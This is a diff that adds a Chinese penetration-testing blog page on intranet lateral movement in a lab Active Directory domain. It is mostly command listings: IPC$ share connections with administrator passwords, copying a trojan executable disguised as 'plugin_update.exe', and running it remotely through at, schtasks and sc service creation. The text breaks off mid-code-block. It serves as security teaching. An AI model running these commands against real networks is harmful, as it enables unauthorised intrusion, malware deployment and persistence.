@@ -1,0 +1,908 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="简介用于已经得到了一个主机之后想要获取其他的主机方法 简单是示例首先这个是一个ad域  web  winserver 2012 pc  win7 dc  winserver2012  由于需要进入域环境，所以我直接拿web服务器开涮，扫描端口 发现了445端口  然后使用msf对其利用，刚好发现第一个就成功了  派发给cs   进行内网探测(端口扫描)   连着一块了 收集信息   然后达到获取其">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网横向移动">
+<meta property="og:url" content="https://tsy244.github.io/2024/02/02/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="简介用于已经得到了一个主机之后想要获取其他的主机方法 简单是示例首先这个是一个ad域  web  winserver 2012 pc  win7 dc  winserver2012  由于需要进入域环境，所以我直接拿web服务器开涮，扫描端口 发现了445端口  然后使用msf对其利用，刚好发现第一个就成功了  派发给cs   进行内网探测(端口扫描)   连着一块了 收集信息   然后达到获取其">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202230557572.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202231259829.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202231624557.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202233715534.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202233825350.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202234022906.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202234342920.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202234404276.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202235539483.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203000036772.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203215439785.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203215729364.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203143455509.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203144625645.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203144701302.png">
+<meta property="article:published_time" content="2024-02-02T00:17:23.000Z">
+<meta property="article:modified_time" content="2024-02-03T14:00:17.284Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202230557572.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>内网横向移动 - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内网横向移动"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-02 08:17" pubdate>
+          February 2, 2024 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          56 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">内网横向移动</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>用于已经得到了一个主机之后想要获取其他的主机方法</p>
+<h1 id="简单是示例"><a href="#简单是示例" class="headerlink" title="简单是示例"></a>简单是示例</h1><p>首先这个是一个ad域</p>
+<blockquote>
+<p>web  winserver 2012</p>
+<p>pc  win7</p>
+<p>dc  winserver2012</p>
+</blockquote>
+<p>由于需要进入域环境，所以我直接拿web服务器开涮，扫描端口</p>
+<p>发现了445端口</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202230557572.png" srcset="/img/loading.gif" lazyload alt="image-20240202230557572"></p>
+<p>然后使用msf对其利用，刚好发现第一个就成功了</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202231259829.png" srcset="/img/loading.gif" lazyload alt="image-20240202231259829"></p>
+<p>派发给cs</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202231624557.png" srcset="/img/loading.gif" lazyload alt="image-20240202231624557"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202233715534.png" srcset="/img/loading.gif" lazyload alt="image-20240202233715534"></p>
+<p>进行内网探测(端口扫描)</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202233825350.png" srcset="/img/loading.gif" lazyload alt="image-20240202233825350"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202234022906.png" srcset="/img/loading.gif" lazyload alt="image-20240202234022906"></p>
+<p>连着一块了</p>
+<p>收集信息</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202234342920.png" srcset="/img/loading.gif" lazyload alt="image-20240202234342920"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202234404276.png" srcset="/img/loading.gif" lazyload alt="image-20240202234404276"></p>
+<p>然后达到获取其他主机的方式</p>
+<p>但是在这之前必须了解一下smb</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">smbclient</span> //<span class="hljs-number">192.168.78.95</span>/C$ -U <span class="hljs-string">&#x27;web\administrator%1qaz<span class="hljs-variable">@WSX</span>&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202235539483.png" srcset="/img/loading.gif" lazyload alt="image-20240202235539483"></p>
+<p>一个共享文件的方式</p>
+<h1 id="内向工具篇"><a href="#内向工具篇" class="headerlink" title="内向工具篇"></a>内向工具篇</h1><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h2><ol>
+<li><p>简介</p>
+<blockquote>
+<p>IPC$ (Internet  Process Connection) 是共享 “命名管道” 的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p>
+</blockquote>
+</li>
+<li><p>使用条件</p>
+<ul>
+<li><p>开放了139,445端口</p>
+<blockquote>
+<p>IPC$ 连接可以实现远程登陆及对默认共享的访问，而139端口的开启表示 netbios 协议的应用。  </p>
+<p>我们可以通过139和445端口来实现对共享文件&#x2F;打印机的访问，因此一般来讲，IPC$连接是需要139或445端口来支持的。</p>
+<p>IPC$ 连接默认会走445端口，不通的话则会走139端口，这两个端口都可以单独实现文件共享  </p>
+</blockquote>
+</li>
+<li><p>目标开启IPC$文件共享服务及默认共享</p>
+<blockquote>
+<p>默认共享是为了方便管理员远程管理而默认开启的共享。  </p>
+<p>所有逻辑磁盘（c$、d$、e$…）和系统目录 WINNT 或WINDOWS（ADMIN$） ，通过IPC连接可以实现对这些默认共享的访问</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203000036772.png" srcset="/img/loading.gif" lazyload alt="image-20240203000036772"></p>
+</li>
+<li><p>需要目标机器的管理员账号和密码  （主要的）</p>
+</li>
+</ul>
+<blockquote>
+<p>  默认情况下只有被添加到远程计算机管理员组的域用户（域管用户）有权限对admin$ 目录建立 IPC 连接  </p>
+<p>  本地的 Administrator 用户也可以，但是默认情况下该用户是被禁用的，如果启用了该用户，那么也可以使用 Administrator 用户远程连接</p>
+</blockquote>
+</li>
+<li><p>常用的指令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-number">1</span>. 连接<br>net use \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span>\ipc<span class="hljs-variable">$</span> /user:administrator <span class="hljs-string">&quot;1qaz@wsx&quot;</span><br>上面的ipc<span class="hljs-variable">$</span>对应上面一幅图的ipc<span class="hljs-variable">$</span><br><br><span class="hljs-number">2</span>. 查看连接情况<br>net use<br><br><span class="hljs-number">3</span>. 查看目标主机时间<br>net time \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span><br><br><span class="hljs-number">4</span>. 删除连接<br>net use \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span>\ipc<span class="hljs-variable">$</span> /<span class="hljs-built_in">del</span><br>net use * /<span class="hljs-built_in">del</span> /y<br><br><span class="hljs-number">5</span>. 上传文件<br><span class="hljs-built_in">copy</span> shell.exe \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span>\c<span class="hljs-variable">$</span>\windows\temp\plugin_update.exe<br><br><span class="hljs-number">6</span>. 下载文件<br><span class="hljs-built_in">copy</span> \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span>\c<span class="hljs-variable">$</span>\<span class="hljs-number">59</span>.exe c:\<br><br><span class="hljs-number">7</span>. 查看目标主机文件<br><span class="hljs-built_in">dir</span> \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span>\c<span class="hljs-variable">$</span><br><br><span class="hljs-number">8</span>. 开放/关闭 ipc<span class="hljs-variable">$</span> 共享。<br>net share ipc<span class="hljs-variable">$</span><br>net share ipc<span class="hljs-variable">$</span> /<span class="hljs-built_in">del</span><br><br><span class="hljs-number">9</span>. 共享计算机 C 盘。<br>net share C=c:\<br><br><span class="hljs-number">10</span>. 映射共享磁盘到本地<br>net use z: \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span>\c<span class="hljs-variable">$</span> /user:administrator <span class="hljs-string">&quot;1qaz@wsx&quot;</span><br><br><span class="hljs-number">11</span>. 查看/删除共享的资源。<br>net share<br>net share C /<span class="hljs-built_in">del</span><br><br><span class="hljs-number">12</span>. 取消IPC远程连接。<br>net use c: /<span class="hljs-built_in">del</span><br>net use * /<span class="hljs-built_in">del</span> /y<br><br><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>IPC$连接失败常见错误号</p>
+</li>
+</ol>
+   <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">错误号</span> <span class="hljs-number">5</span><span class="hljs-string">，拒绝访问</span>                      <span class="hljs-string">【很可能你使用的用户不是管理员权限，先提升权限】</span><br><span class="hljs-string">错误号</span> <span class="hljs-number">51</span><span class="hljs-string">，Windows</span> <span class="hljs-string">无法找到网络路径</span>     <span class="hljs-string">【网络有问题】</span><br><span class="hljs-string">错误号</span> <span class="hljs-number">53</span><span class="hljs-string">，找不到网络路径</span>               <span class="hljs-string">【ip</span> <span class="hljs-string">地址错误；目标未开机；目标</span> <span class="hljs-string">lanmanserver</span> <span class="hljs-string">服务未启动；目标有防火墙（端口过滤）】</span><br><span class="hljs-string">错误号</span> <span class="hljs-number">67</span><span class="hljs-string">，找不到网络名</span>                 <span class="hljs-string">【你的</span> <span class="hljs-string">lanmanworkstation</span> <span class="hljs-string">服务未启动；目标删除了</span> <span class="hljs-string">ipc$；】</span><br><span class="hljs-string">错误号</span> <span class="hljs-number">1219</span><span class="hljs-string">，提供的凭据与已存在的凭据集冲突</span>     <span class="hljs-string">【你已经和对方建立了一个ipc$，请删除后再连】</span><br><span class="hljs-string">错误号</span> <span class="hljs-number">1326</span><span class="hljs-string">，未知的用户名或错误密码</span>             <span class="hljs-string">【用户名或密码错误】</span><br><span class="hljs-string">错误号</span> <span class="hljs-number">1385</span><span class="hljs-string">，登录失败：未授予用户在此计算机上的请求登录类型</span><br><span class="hljs-string">错误号</span> <span class="hljs-number">1792</span><span class="hljs-string">，试图登录，但是网络登录服务没有启动</span>     <span class="hljs-string">【目标NetLogon服务未启动[连接域控会出现此情况]】</span><br><span class="hljs-string">错误号</span> <span class="hljs-number">2242</span><span class="hljs-string">，此用户的密码已经过期</span>                   <span class="hljs-string">【目标有帐号策略，强制定期要求更改密码】</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="IPC-AT-Schtasks"><a href="#IPC-AT-Schtasks" class="headerlink" title="IPC+AT+Schtasks"></a>IPC+AT+Schtasks</h2><ol>
+<li><p>at是什么</p>
+<blockquote>
+<p>  AT命令可在指定时间和日期、在指定计算机上运行命令和程序。  </p>
+</blockquote>
+<p>简单理解为可以当作定时任务</p>
+</li>
+<li><p>利用at</p>
+<blockquote>
+<p>net use \10.10.10.201\c$ &#x2F;user:administrator “1qaz@WSX3e”<br>copy 59.exe \10.10.10.201\c$<br>查看远程主机时间：net time \10.10.10.201<br>AT命令添加任务：at \10.10.10.201 19:08 c:\59.exe<br>AT命令删除任务：at \10.10.10.201 1 &#x2F;delete<br>AT命令查看任务：at \10.10.10.201</p>
+<p>#查看at任务列表，已经执行了的，不会显示。</p>
+</blockquote>
+<p>注意</p>
+<blockquote>
+<p>  问题：执行at命令时，显示绑定句柄无效。  </p>
+<p>  解决：echo 10.10.11.100 RemoteHost &gt;  C:\Windows\System32\drivers\etc\hosts  </p>
+<p>  AT命令在windows server 2012等新版系统中已被弃用  </p>
+<p>AT命令如果找不到网络路径，则判断是目标主机已禁用 Task Scheduler 服务</p>
+</blockquote>
+</li>
+<li><p>Schtasks简介</p>
+<p>  由于AT在windows server 2012等新版系统中已被弃用，所以需要使用 schtasks 命令代替。  </p>
+<blockquote>
+<p>  允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任务  </p>
+</blockquote>
+<p>常用的指令</p>
+<blockquote>
+<p>&#x2F;Create     创建新计划任务。<br>&#x2F;Delete     删除计划任务。<br>&#x2F;Query      显示所有计划任务。<br>&#x2F;Change     更改计划任务属性。<br>&#x2F;Run        按需运行计划任务。<br>&#x2F;End        中止当前正在运行的计划任务。<br>&#x2F;ShowSid    显示与计划的任务名称相应的安全标识符。<br>&#x2F;?          显示此帮助消息。</p>
+</blockquote>
+<p>  更多请参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39680564/article/details/88993633">https://blog.csdn.net/qq_39680564/article/details/88993633</a>  </p>
+</li>
+<li><p>横向移动</p>
+<p>命令格式</p>
+<blockquote>
+<p>#创建任务<br>schtasks &#x2F;create &#x2F;tn(任务名字) task1 &#x2F;U 域\域用户 &#x2F;P 域用户密码 &#x2F;tr 命令 &#x2F;sc(计划类型) ONSTART &#x2F;s 域机器ip &#x2F;RU(启动用户) system</p>
+<p>#运行任务<br>schtasks &#x2F;run &#x2F;tn task1 &#x2F;s 192.168.10.2 &#x2F;U 域&#x2F;域用户 &#x2F;P 域用户密码</p>
+<p>#删除任务<br>schtasks &#x2F;F &#x2F;delete &#x2F;tn task1 &#x2F;s 域机器ip &#x2F;U 域\域用户 &#x2F;p 域用户密码</p>
+</blockquote>
+<blockquote>
+<p>schtasks &#x2F;create             创建新的计划任务。<br>         &#x2F;sc schedule        指定计划类型。有效值为 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY、ONCE、ONSTART、ONLOGON、ONIDLE。<br>         &#x2F;mo modifier        指定任务在其计划类型内的运行频率。这个参数对于 MONTHLY 计划是必需的。<br>                             对于 MINUTE、HOURLY、DAILY 或 WEEKLY 计划，这个参数有效，但也可选。默认值为 1。<br>         &#x2F;tr <TaskRun>       指定任务运行的程序或命令。如果忽略该路径，SchTasks.exe 将假定文件在 Systemroot\System32 目录下。<br>         &#x2F;tn <TaskName>      指定任务的名称。</p>
+</blockquote>
+<p>使用过程</p>
+<p>创建连接</p>
+<blockquote>
+<p>net use \\10.10.10.201 &#x2F;user:administrator “1qaz@WSX34”<br>net use</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203215439785.png" srcset="/img/loading.gif" lazyload alt="image-20240203215439785"></p>
+<p>上传木马（一般都是正向的payload）</p>
+<blockquote>
+<p>dir \10.10.10.201\c$<br>copy c:\windows\temp\59.exe \10.10.10.201\c$</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203215729364.png" srcset="/img/loading.gif" lazyload alt="image-20240203215729364"></p>
+<p>远程主机创建定时任务</p>
+<blockquote>
+<p>schtasks &#x2F;create &#x2F;s 10.10.10.201 &#x2F;u de1ay\administrator &#x2F;p “1qaz@WSX3e” &#x2F;sc MINUTE &#x2F;mo 1 &#x2F;tn test2 &#x2F;tr “c:\59.exe”</p>
+</blockquote>
+<p>  Schtasks运行远程主机上的计划任务  </p>
+<blockquote>
+<p>  schtasks &#x2F;run &#x2F;s 10.10.10.201  &#x2F;u de1ay\administrator &#x2F;p “1qaz@WSX3e” &#x2F;tn test2  </p>
+</blockquote>
+<p>  Schtasks删除远程主机上的计划任务  </p>
+<blockquote>
+<p>  schtasks &#x2F;delete &#x2F;tn At1 &#x2F;s 10.10.10.201  &#x2F;u administrator &#x2F;p 1qaz@WSX3e</p>
+</blockquote>
+</li>
+</ol>
+<h2 id="IPC-SC"><a href="#IPC-SC" class="headerlink" title="IPC+SC"></a>IPC+SC</h2><ol>
+<li><p>sc简介</p>
+<p>sc可以注册，删除，查询系统服务</p>
+</li>
+<li><p>sc远程注册服务</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#sc远程创建服务</span><br><span class="hljs-comment">#本地系统启动</span><br>sc <span class="hljs-string">\\10.10.10.201</span> create test binpath= <span class="hljs-string">&quot;c:\59.exe&quot;</span> password= <span class="hljs-number">1qaz</span>@WSX3e<br><br><span class="hljs-comment">#当 &quot;de1ay\administrator&quot; 用户登录时启动</span><br>sc <span class="hljs-string">\\10.10.10.201</span> create test(服务名) binpath= <span class="hljs-string">&quot;c:\59.exe&quot;</span> obj= <span class="hljs-string">&quot;de1ay\administrator&quot;</span> password= <span class="hljs-number">1qaz</span>@WSX3e<br><br><span class="hljs-comment">#sc启动指定服务</span><br>sc <span class="hljs-string">\\10.10.10.201</span> start test<br><br><span class="hljs-comment">#sc停止指定服务</span><br>sc <span class="hljs-string">\\10.10.10.201</span> stop test<br>sc <span 